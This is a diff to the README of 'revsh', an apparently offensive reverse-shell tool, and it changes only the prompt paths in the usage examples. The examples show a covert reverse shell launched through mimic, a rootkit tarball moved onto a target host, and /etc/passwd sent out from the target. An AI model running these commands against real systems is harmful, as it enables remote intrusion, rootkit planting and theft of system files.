@@ -115,18 +115,18 @@ Note, if you configured the binary at build time to change the IP:PORT address t
 For a covert reverse shell, _revsh_ can be invoked from within [_mimic_](https://github.com/emptymonkey/mimic) on the target host:
 
 	empty@monkey:~$ revsh -c
-	target@kitty:/tmp$ ./mimic -q -e './revsh -s "./mimic -e /bin/bash"'
+	target@kitty:~$ ./mimic -q -e './revsh -s "./mimic -e /bin/bash"'
 
 For netcat style data transfer (with the crypto benefits of _revsh_) invoke _revsh_ with the -n switch. This is useful for moving tools on to the target host:
 
 	empty@monkey:~$ cat rootkit.tar | ./revsh -c -n
-	target@kitty:/tmp$ ./revsh >./totally_not_a_rootkit.tar
+	target@kitty:~$ ./revsh >./totally_not_a_rootkit.tar
 	
 
 Or for moving data out from the target host:
 
 	empty@monkey:~$ revsh -c
-	target@kitty:/tmp$ cat /etc/passwd | ./revsh -n
+	target@kitty:~$ cat /etc/passwd | ./revsh -n
 
 
 ## Installation ##
